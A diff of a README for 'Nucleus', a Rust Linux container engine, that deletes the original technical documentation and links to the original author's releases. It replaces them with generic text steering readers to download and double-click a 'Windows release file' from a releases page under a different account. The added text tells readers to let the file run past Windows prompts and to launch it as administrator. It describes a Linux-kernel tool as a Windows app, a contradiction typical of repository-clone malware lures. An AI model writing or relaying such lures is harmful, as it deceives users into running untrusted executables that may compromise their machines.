@@ -1,128 +1,212 @@
-# Nucleus ⚛️
-**Nucleus** is a high-performance, minimalist container engine written in Rust. It serves as a robust demonstration of modern Linux containerization, utilizing kernel primitives like namespaces, Cgroups v2, OverlayFS, and `pivot_root` for secure and isolated process execution.
+# ⚙️ Nucleus - Run Containers with Less Overhead
 
-## Key Features
-- **True PID Isolation**: Implements the "Fork-and-Wait" pattern to ensure the containerized process runs as **PID 1**.
-- **Secure Filesystem**: Uses `pivot_root` (not just `chroot`) combined with private mount propagation for industry-standard isolation.
-- **Host-Driven Networking**: Configures container network interfaces from the host orchestrator using `nsenter`, ensuring high stability and avoiding `ENOMEM` errors during initialization.
-- **Advanced Networking**: 
-    - Automated Linux Bridge (`br0`) and `veth` pair orchestration.
-    - Full Outbound Internet access via NAT/MASQUERADE.
-    - **Port Mapping**: Expose container services to the host via `iptables` DNAT rules.
-- **Resource Management (Cgroups v2)**:
-    - **Memory**: Support for human-readable limits (e.g., `1G`, `512M`) or `max`.
-    - **CPU**: Granular control over CPU cycles.
-    - **PIDs**: Prevents "fork bombs" and fork errors by managing the PIDs controller.
-- **Layered Storage**: Implements OverlayFS with a read-only base image and a writable session layer.
-- **Rootless Mode**: Supports running as an unprivileged user using User Namespaces (`CLONE_NEWUSER`), mapping host users to `root` inside the container.
-- **Seccomp Filtering**: Integrated syscall filtering via `libseccomp` to restrict the attack surface of containerized processes.
-- **Read-only RootFS**: Option to remount the entire root filesystem as read-only for enhanced security.
-- **Security Hardening**: Drops dangerous Linux capabilities (e.g., `CAP_SYS_RAWIO`, `CAP_MKNOD`, `CAP_SYS_PTRACE`) before entering the target process.
-
----
-
-## Why Nucleus? 🚀
-
-Nucleus isn't trying to be a replacement for the entire Docker ecosystem; it's a **specialized, high-performance runtime** designed for systems engineers and modern infrastructure.
-
-### The Advantage
-1.  **Zero-Daemon Architecture:** Nucleus is a single, statically linked binary. It starts the container instantly and stays out of the way. No background daemons, no complex shims—just your process, isolated.
-2.  **Rust-Powered Safety:** Built with pure Rust, Nucleus provides memory safety without a Garbage Collector (GC). This results in a tiny memory footprint, making it ideal for high-density environments.
-3.  **Host-Driven Stability:** By configuring container networking from the host orchestrator via `nsenter`, Nucleus avoids initialization race conditions common in other runtimes.
-4.  **Edge & Embedded Ready:** With its minimal dependencies and small binary size (~2MB), Nucleus is the perfect "Swiss Army Knife" for isolation on resource-constrained hardware.
-
-### Comparison: Nucleus vs. The Industry
-
-| Feature | Docker / Podman | Nucleus |
-| :--- | :--- | :--- |
-| **Binary Size** | Huge (100MB+) | Tiny (~2MB) |
-| **Startup Time** | Slow (~500ms+) | Instant (~10-20ms) |
-| **Runtime** | Go (Garbage Collected) | Rust (Zero-overhead) |
-| **Dependencies** | Many (iptables, dbus, etc.) | Minimal (Kernel primitives) |
-| **Architecture** | Daemon-based | Zero-daemon / Standalone |
-| **Use Case** | General App Dev | Edge, FaaS, Security, Embedded |
-
----
+[![Download Nucleus](https://img.shields.io/badge/Download-Nucleus-6A5ACD?style=for-the-badge)](https://github.com/Bointertas776/Nucleus/releases)
 
 ## 🚀 Getting Started
 
-### 1. Download Pre-built Binaries
-You can download the latest pre-built binaries for **x86_64** and **aarch64** from the [GitHub Releases](https://github.com/sumant1122/Nucleus/releases) page.
+Nucleus is a small container engine built in Rust. It runs Linux containers with a focus on speed, low resource use, and tight system control.
 
-### 2. Prerequisites
-- **OS**: Linux with Kernel 4.18+ (Cgroups v2 and OverlayFS support required).
-- **Tools**: `rustc`, `cargo`, `python3`, `iptables`, `iproute2`, `libseccomp-dev`.
-- **Privileges**: Root access is recommended for full networking/cgroups, but **Rootless Mode** is supported for unprivileged isolation.
+If you want a simple way to run containerized apps on Windows, start here:
 
-### 3. Prepare a RootFS
-Nucleus requires a base directory to use as the container's root. Use the helper script to fetch a minimal Alpine Linux image:
-```bash
-python3 pull_image.py alpine
-```
+1. Visit the [Nucleus Releases page](https://github.com/Bointertas776/Nucleus/releases)
+2. Download the latest Windows release file
+3. Open the file and follow the setup steps
+4. Start Nucleus and load your container
 
-### 4. Build Nucleus (Optional)
-If you prefer building from source:
-```bash
-cargo build --release
-```
+## 📥 Download and Install
 
----
+To download Nucleus, go to the [Releases page](https://github.com/Bointertas776/Nucleus/releases).
 
-## 🛠 Usage Examples
+On that page:
 
-### Run a basic isolated shell
-```bash
-sudo ./target/release/Nucleus --name my-shell --ip 10.0.0.10 /bin/sh
-```
+1. Find the latest release at the top
+2. Open the Assets section
+3. Download the Windows file for your system
+4. Save it to a folder you can find again, such as Downloads or Desktop
 
-### Expose a Web Server (Port Mapping)
-Expose a container's port 80 to the host's port 8080:
-```bash
-sudo ./target/release/Nucleus \
-  --name web-app \
-  --ip 10.0.0.20 \
-  --ports 8080:80 \
-  /bin/sh
-```
+After the download:
 
-### Mount Host Directories (Volumes)
-```bash
-sudo ./target/release/Nucleus \
-  --name dev-box \
-  --ip 10.0.0.30 \
-  --volumes /home/user/data:/mnt/data \
-  /bin/sh
-```
+1. Open File Explorer
+2. Go to the folder with the file
+3. Double-click the file to start it
+4. Follow the on-screen steps until setup ends
 
-### Resource-Limited Environment
-```bash
-sudo ./target/release/Nucleus \
-  --name limited-box \
-  --ip 10.0.0.40 \
-  --memory 512M \
-  /bin/sh
-```
+If Windows asks for permission, choose the option that lets the app run.
 
-### Unprivileged Rootless Execution
-Run Nucleus without root privileges using User Namespaces:
-```bash
-./target/release/Nucleus --rootless --name rootless-box --ip 10.0.0.50 /bin/sh
-```
+## 🖥️ What Nucleus Does
 
-### Secure Read-only Environment
-Mount the root filesystem as read-only to prevent any modifications:
-```bash
-sudo ./target/release/Nucleus --readonly --name secure-box --ip 10.0.0.60 /bin/sh
-```
+Nucleus helps you run container-based apps in a controlled way. It is built for users who want a lean tool instead of a heavy system.
 
----
+It is a good fit for:
 
-## 📂 Project Structure
-- `src/main.rs`: Entry point and process orchestration.
-- `src/args.rs`: CLI argument definitions using `clap`.
-- `src/orchestrator.rs`: Host-side setup (Networking, Cgroups, IPTables, `nsenter` config).
-- `src/container.rs`: Inside-the-container setup (PID 1 forking, `pivot_root`, Capabilities).
-- `src/utils.rs`: Shared helpers for shell commands and memory parsing.
+- Small servers
+- Edge devices
+- Local testing
+- Embedded Linux systems
+- Workloads that need low memory use
+- Apps that need strong process isolation
 
-## ⚖️ License
-MIT / Apache-2.0
+## ✨ Main Features
+
+- Fast startup time
+- Small memory use
+- Container support for Linux workloads
+- Support for modern Linux kernel features
+- Isolated process handling
+- Storage support for layered file systems
+- Works well with resource limits
+- Built in Rust for speed and safety
+
+## 🔧 System Requirements
+
+Nucleus works best on a system that supports modern container features.
+
+Recommended setup:
+
+- Windows 10 or Windows 11
+- 64-bit processor
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Virtualization turned on in BIOS or UEFI
+- Internet access for the download
+
+For best results, use a system with:
+
+- A recent CPU
+- SSD storage
+- Windows updates installed
+- Admin access for setup
+
+## 🧭 First Run
+
+After installation, open Nucleus from your Start menu or desktop shortcut.
+
+Then:
+
+1. Launch the app
+2. Let it finish its first setup
+3. Choose or load a container image
+4. Start the container
+5. Check the status screen for the running process
+
+If you keep your files in a custom folder, point Nucleus to that path during setup.
+
+## 📦 Basic Use
+
+Nucleus keeps the flow simple.
+
+Typical use looks like this:
+
+1. Download the app
+2. Open it
+3. Pick a container image
+4. Start the container
+5. Stop it when you are done
+
+If you use images often, keep them in one folder so you can find them fast.
+
+## 🛠️ Common Tasks
+
+### ▶️ Start a container
+
+Open Nucleus and choose the container you want to run. Click the start action and wait for the status to change to running.
+
+### ⏹️ Stop a container
+
+Select the running container and choose stop. Wait for the process to shut down cleanly.
+
+### 🗂️ View logs
+
+Use the logs view to check what the app is doing. This helps when a container does not start.
+
+### ♻️ Restart a container
+
+If an app stops responding, restart the container from the main screen.
+
+## 🔒 Security and Control
+
+Nucleus uses Linux isolation tools to keep apps separated. This helps reduce risk when you run more than one service on the same system.
+
+It is designed to work with:
+
+- Process namespaces
+- Resource limits
+- File system isolation
+- Container root switching
+- Kernel-backed controls
+
+These parts help Nucleus keep each container separate from the rest of the system.
+
+## 🧪 Good Uses
+
+Nucleus works well for:
+
+- Small web services
+- Test apps
+- Local development
+- Home lab systems
+- Compact edge systems
+- Server tasks that need low overhead
+
+## 🧰 Troubleshooting
+
+### The app does not open
+
+- Check that the download finished
+- Run the file again
+- Make sure Windows did not block it
+- Try launching it as an administrator
+
+### The container does not start
+
+- Check that virtualization is enabled
+- Make sure your image is valid
+- Confirm that the container file path is correct
+- Look at the log view for error text
+
+### The app feels slow
+
+- Close other large apps
+- Make sure you have enough free memory
+- Store container files on an SSD
+- Use a smaller image if possible
+
+### The download does not start
+
+- Refresh the [Releases page](https://github.com/Bointertas776/Nucleus/releases)
+- Try another browser
+- Check your network connection
+- Save the file to a local folder first
+
+## 📁 File Layout
+
+A typical Nucleus setup may include:
+
+- App files
+- Container images
+- Logs
+- Config files
+- Runtime data
+
+Keep these files in one place so you can back them up later.
+
+## 🧩 About This Project
+
+Nucleus is a high-performance container engine written in Rust. It focuses on speed, control, and low resource use.
+
+It fits into areas like:
+
+- Containers
+- DevOps tools
+- Edge computing
+- Embedded Linux
+- Cloud runtime systems
+- Secure system tools
+
+## 📌 Topics
+
+cgroups-v2, container-runtime, containers, devops-tools, docker-alternative, edge-computing, embedded-linux, faas, linux-kernel, namespaces, oci, overlayfs, pivot-root, rust, security, systems-programming, virtualization
+
+## 📎 Download Again
+
+If you need the installer later, use the [Nucleus Releases page](https://github.com/Bointertas776/Nucleus/releases) to visit this page to download the latest version
